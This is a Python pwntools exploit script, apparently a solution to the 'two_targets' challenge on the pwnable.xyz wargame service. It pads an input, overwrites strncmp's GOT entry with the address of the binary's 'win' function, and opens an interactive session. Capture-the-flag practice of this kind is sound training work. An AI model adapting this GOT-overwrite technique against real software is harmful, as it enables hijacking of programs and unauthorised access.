#!/usr/bin/python2
from pwn import *

#p = process('./two_targets')
p = remote('svc.pwnable.xyz',30031)
e = ELF('./two_targets')
strncmp_got = e.got['strncmp']
win = e.symbols['win']

p.recv()

p.sendline('2')
payload = "A"*16 + p64(strncmp_got)
p.recv()
p.sendline(payload)

p.recv()

p.sendline('3')
p.recv()
p.sendline(str(win))

p.recv()

p.sendline('4')


p.interactive()
